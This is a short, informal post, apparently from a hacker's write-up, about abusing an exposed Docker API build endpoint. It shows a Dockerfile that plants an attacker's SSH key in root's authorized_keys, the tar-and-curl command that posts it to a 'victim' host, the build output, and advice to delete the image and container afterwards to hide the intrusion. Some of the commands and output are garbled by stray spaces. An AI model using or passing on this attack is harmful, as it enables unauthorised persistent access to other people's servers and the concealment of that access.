## Quick update, I'll write in more detail later..

PS: There are THOUSANDS of other ways to do this .. in my case as well.

So the Docker API server does not have SSH, does not have interpreted languages, has nothing !!)

I solved this by quickly sending a Dockerfile file to the API build

```
FROM <any image>
USER root
ENTRYPOINT echo "PUBLIC-KEY" >> /root/.ssh/authorized_keys
```

Needs this inside a TAR file, which will be sent to the server (then use your imagination)

```bash
$ tar -cvf p4y.tar Dockerfile
$ curl -XPOST -H "content-type: application / x-tar" --data-binary @ p4y.tar "http://victim/build"

{"stream": "Step 1: FROM some-minimal-image \ n"}
{"stream": "--- \ u003e 214bf35152ea \ n"}
{"stream": "Step 2: user root \ n"}
{"stream": "--- \ u003e Running at 78af75a2b4d7 \ n"}
{"stream": "--- \ u003e 74d106dea791 \ n"}
{"stream": "Removing the intermediate container 78af75a2b4d7 \ n"}
{"stream": "Step 3: ENTRYPOINT echo \" ssh-rsa MY_PUBLIC_KEY \ "\ u003e /root/.ssh/authorized_keys\n"}
{"stream": "--- \ u003e Running on bebcc4a6ba0f \ n"}
{"stream": "--- \ u003e 0470cc164544 \ n"}
{"stream": "Removing the intermediate container bebcc4a6ba0f \ n"}
{"stream": "0470cc164544 successfully built \ n"}
```

Now, just connect the container with the image and then start.

PS: remember to delete the image and the container later;)

Kisses
